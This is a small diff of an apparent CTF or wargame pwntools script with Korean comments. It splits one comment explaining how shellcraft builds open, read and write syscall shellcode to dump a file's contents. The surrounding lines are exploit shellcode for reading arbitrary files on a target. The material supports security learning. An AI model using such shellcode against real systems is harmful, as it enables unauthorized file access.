@@ -101,7 +101,8 @@ code = ''
 code += shellcraft.open(path,0 ,0)
 
 #shellcraft를 이용하여 read system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
-#fd 인자로 rax를 쓰는 이유는 open syscall의 반환 값이 rax에 저장되기 때문이다. 주의해야할 점은 buffer 인자로 (rsp-count)가 아니라 rsp 값을 대입해야한다.
+#fd 인자로 rax를 쓰는 이유는 open syscall의 반환 값이 rax에 저장되기 때문이다.
+#주의해야할 점은 buffer 인자로 (rsp-count)가 아니라 rsp 값을 대입해야한다.
 code += shellcraft.read('rax','rsp',0x1000)
 
 #shellcraft를 이용하여 write system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
